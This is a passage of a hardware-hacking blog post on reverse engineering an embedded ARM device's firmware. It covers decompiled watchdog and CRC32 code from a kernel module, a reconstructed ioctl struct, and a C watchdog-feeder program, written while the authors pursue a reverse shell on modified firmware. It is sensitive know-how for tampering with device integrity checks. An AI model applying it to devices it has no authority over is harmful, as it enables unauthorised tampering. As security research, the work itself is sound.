+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcbe</span>          <span class=kt>int16_t</span> <span class=n>var_24_1</span> <span class=o>=</span> <span class=n>arg1</span><span class=p>.</span><span class=n>w</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcbe</span>          
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcc8</span>          <span class=k>if</span> <span class=p>(</span><span class=n>ioctl</span><span class=p>(</span><span class=n>dev_pdcWdt</span><span class=p>,</span> <span class=mh>0xc0105700</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>var_28</span><span class=p>)</span> <span class=n>s</span><span class=o>&gt;=</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcf6</span>              <span class=k>return</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcf6</span>          
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcce</span>          <span class=kt>int32_t</span> <span class=n>var_30_2</span> <span class=o>=</span> <span class=mh>0xcc</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcd0</span>          <span class=n>dev_pdcWdt_2</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcd6</span>          <span class=n>r2</span> <span class=o>=</span> <span class=s>&#34;[libpdi] ERROR  (%s|%d): Fail to…&#34;</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcb4</span>      <span class=k>else</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adce0</span>          <span class=kt>int32_t</span> <span class=n>var_30_3</span> <span class=o>=</span> <span class=mh>0xc4</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adce2</span>          <span class=n>dev_pdcWdt_2</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adce8</span>          <span class=n>r2</span> <span class=o>=</span> <span class=s>&#34;[libpdi] ERROR  (%s|%d): The Wdt…&#34;</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adce8</span>      
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcec</span>      <span class=n>log</span><span class=p>(</span><span class=n>dev_pdcWdt_2</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>r2</span><span class=p>,</span> <span class=s>&#34;PDI_wdtFeed&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=mo>000</span><span class=n>adcf0</span>      <span class=k>return</span> <span class=mh>0xffffffff</span>
+</span></span></code></pre></td></tr></table></div></div><p>Is it possible that maybe we need to feed the watchdog from that character device as sonia is doing? For us, it seemed worth to try, the only effort needed was to reconstruct the valid struct for the <code>ioctl</code> operation with some reverse engineering.</p><p>We found out that Ghidra was doing a better job than Binary Ninja to reverse engineer ARM32 kernel modules (and vice versa for userland binaries). The <code>pdcWdt</code> character device is created in the <code>pdc.ko</code> module init function through some vendor customized wrapper functions:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>undefined4</span> <span class=nf>PDC_wdtInit</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=cm>/* .. */</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>OSA_logWrite</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s>&#34;[pdc] ERROR  (%s|%d): Fail to create mutex!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=s>&#34;PDC_wdtInit&#34;</span><span class=p>,</span><span class=mh>0x4e2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>iVar1</span> <span class=o>=</span> <span class=n>OSA_spinlockCreate</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span><span class=o>&amp;</span><span class=n>DAT_00050fd0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>OSA_logWrite</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=s>&#34;[pdc] ERROR  (%s|%d): Fail to create hSpinLock!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=s>&#34;PDC_wdtInit&#34;</span><span class=p>,</span><span class=mh>0x4e8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>local_48</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>local_44</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>local_3c</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>gWdtModule</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>local_40</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>gWdtCdevOps</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>local_4c</span> <span class=o>=</span> <span class=s>&#34;pdcWdt&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>iVar1</span> <span class=o>=</span> <span class=n>OSA_kCdevCreate</span><span class=p>(</span><span class=o>&amp;</span><span class=n>local_4c</span><span class=p>,</span><span class=o>&amp;</span><span class=n>gWdtModule</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=cm>/* ...*/</span>
+</span></span></code></pre></td></tr></table></div></div><p>The <code>OSA_kCdevCreate</code> module creates the <code>/dev/pdcWdt</code> device and assign the global <code>gWdtCdevOps</code> variable for its file operations, from which we can easily identify the <code>ioctl</code> handler (renamed to <code>WDT_ioctl</code>) and the previously identified <code>0xc0105700</code> ioctl command. By analyzing the kernel ioctl code parsing and the userland sonia feeding logic, we were able to reconstruct a valid C structure that we could use in the ioctl <code>0xc0105700</code> command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=k>struct</span> <span class=n>wdt_struct</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>s1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s5</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s6</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=kt>int16_t</span> <span class=n>s7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span></code></pre></td></tr></table></div></div><p>Following the sonia binary logic, <code>wdt_struct.s1</code> is always set to <code>-1</code> while <code>wdt_struct.s2</code> accepts a decremental number starting from 3 to 1. <code>PDI_wdtFeed</code> is always called in <code>PDI_wdtFeed(3)</code>, <code>PDI_wdtFeed(2)</code>, <code>PDI_wdtFeed(1)</code> order. The remaining members of the struct are just a padding to avoid memory issues since the kernel is copying from userland (using a <code>copy_from_user</code> wrapper) <code>0x10</code> bytes.</p><p>The following C program has been created to &ldquo;emulate&rdquo; the sonia feeding behavior:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/stat.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=cp>#define WATCHDOG_FEED  0xc0105700
+</span></span></span><span class=line><span class=cl><span class=cp>#define DEV_NAME      &#34;/dev/pdcWdt&#34;
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>wdt_struct</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=n>s1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s4</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s5</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s6</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=kt>int16_t</span> <span class=n>s7</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>};</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>PDI_wdtFeed</span><span class=p>(</span><span class=kt>int</span> <span class=n>dev_fd</span><span class=p>,</span> <span class=kt>int</span> <span class=n>n</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>  <span class=k>struct</span> <span class=n>wdt_struct</span> <span class=n>wdt_input</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>res</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[*] v2 feeding watchdog with %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>n</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>wdt_input</span><span class=p>.</span><span class=n>s1</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>wdt_input</span><span class=p>.</span><span class=n>s2</span> <span class=o>=</span> <span class=n>n</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>res</span> <span class=o>=</span> <span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=n>WATCHDOG_FEED</span> <span class=p>,</span> <span class=o>&amp;</span><span class=n>wdt_input</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34; =&gt;ioctl res: %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>res</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span><span class=o>**</span><span class=n>argv</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;[*] Watchdog feeder through /dev/pdcWdt</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>n_sleep</span>   <span class=o>=</span> <span class=n>atoi</span><span class=p>(</span><span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>  <span class=c1>//int dev_fd    = open(DEV_NAME, 2);
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>dev_fd</span>    <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=n>DEV_NAME</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span><span class=p>(</span><span class=n>dev_fd</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[!] ERROR! cannot open file %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>DEV_NAME</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>    <span class=n>PDI_wdtFeed</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>PDI_wdtFeed</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>PDI_wdtFeed</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span> <span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>printf</span><span class=p>(</span><span class=s>&#34;[*] Sleeping %d seconds</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>n_sleep</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=n>n_sleep</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=n>printf</span><span class=p>(</span><span class=s>&#34;[*] Watchdog feeder end</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Due to size issues into recreating the firmware image, we also had to cross compile the binary while dynamically linking to the uClibc library. We did the same for busybox and compile these things with old toolchains and libc libraries is literally not funny at all. However, we compiled and executed it in a loop (as can be seen from the code) and&mldr; nothing, the system reboots after 40 seconds, again.</p><a href=#looking-from-another-perspective><h4 id=looking-from-another-perspective><span class=hanchor arialabel=Anchor># </span>Looking from another perspective</h4></a><p>We tried to feed the dog in multiple different ways, we wanted to achieve a stable reverse shell but couldn&rsquo;t. Maybe we were seeing something from the wrong perspective? We started to create custom firmwares with the only objective to debug early stages and retrieve as much logs as possible (especially from <code>dmesg</code>). We have used the mounted sdcard (remember?) to write the logs and we used background processes to write the output of <code>dmesg</code> into <code>/mnt/sdcard/</code> (<em>we were taking into consideration that we were not in an SMP system</em>).
+And from <code>dmesg</code> logs, we found some interesting and catchy strings:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>[pdc] Both of Chief and Backup File CRC check OK!
+</span></span><span class=line><span class=cl>[pdc] phyaddr = 23fc4000, memLen = 2000
+</span></span><span class=line><span class=cl>[pdc] DDRdata crc incorrect, Load from sramFile
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p><a href=https://en.wikipedia.org/wiki/Cyclic_redundancy_check rel=noopener>CRC</a> could stands for the classic checksum validation mechanism and we can see, from the output, that something is also failing in the integrity validation (<em>DDRdata crc incorrect</em>). Of course, that makes sense because we have modified the firmware image and at the start of it there is a CRC32 table (as can be seen from the first binwalk image). By looking around these strings in our already known <code>pdc.ko</code> module, we were able to identify, with ghidra, a classic pattern of decompiled code that looks exactly like CRC32 operations:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>uint</span> <span class=nf>PDC_crc32</span><span class=p>(</span><span class=n>uint</span> <span class=n>param_1</span><span class=p>,</span><span class=n>byte</span> <span class=o>*</span><span class=n>param_2</span><span class=p>,</span><span class=kt>int</span> <span class=n>param_3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=n>uint</span> <span class=n>uVar1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>idx_2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>byte</span> <span class=o>*</span><span class=n>idx</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>  <span class=n>param_1</span> <span class=o>=</span> <span class=o>~</span><span class=n>param_1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=mi>7</span> <span class=o>&lt;</span> <span class=n>param_3</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>param_2</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>iVar2</span> <span class=o>=</span> <span class=n>param_3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>iVar2</span> <span class=o>=</span> <span class=n>iVar2</span> <span class=o>+</span> <span class=o>-</span><span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>]</span> <span class=o>^</span> <span class=n>param_1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>param_1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>uVar1</span> <span class=o>^</span> <span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>7</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>uVar1</span> <span class=o>^</span> <span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>6</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>uVar1</span> <span class=o>^</span> <span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>5</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>uVar1</span> <span class=o>^</span> <span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>4</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>3</span><span class=p>]</span> <span class=o>^</span> <span class=n>uVar1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>uVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>2</span><span class=p>]</span> <span class=o>^</span> <span class=n>uVar1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=n>idx</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>^</span> <span class=n>uVar1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>uVar1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>idx</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>while</span> <span class=p>(</span><span class=mi>7</span> <span class=o>&lt;</span> <span class=n>iVar2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>uVar1</span> <span class=o>=</span> <span class=n>param_3</span> <span class=o>-</span> <span class=mi>8U</span> <span class=o>&gt;&gt;</span> <span class=mi>3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>param_3</span> <span class=o>=</span> <span class=p>(</span><span class=n>param_3</span> <span class=o>-</span> <span class=mi>8U</span><span class=p>)</span> <span class=o>+</span> <span class=n>uVar1</span> <span class=o>*</span> <span class=o>-</span><span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>param_2</span> <span class=o>=</span> <span class=n>param_2</span> <span class=o>+</span> <span class=p>(</span><span class=n>uVar1</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>param_3</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>idx</span> <span class=o>=</span> <span class=n>param_2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>do</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>idx_2</span> <span class=o>=</span> <span class=n>idx</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>param_1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=o>&amp;</span><span class=n>crc32_table</span> <span class=o>+</span> <span class=p>((</span><span class=o>*</span><span class=n>idx</span> <span class=o>^</span> <span class=n>param_1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xff</span><span class=p>)</span> <span class=o>*</span> <span class=mi>4</span><span class=p>)</span> <span class=o>^</span> <span class=n>param_1</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>idx</span> <span class=o>=</span> <span class=n>idx_2</span><span class=p>;</span>
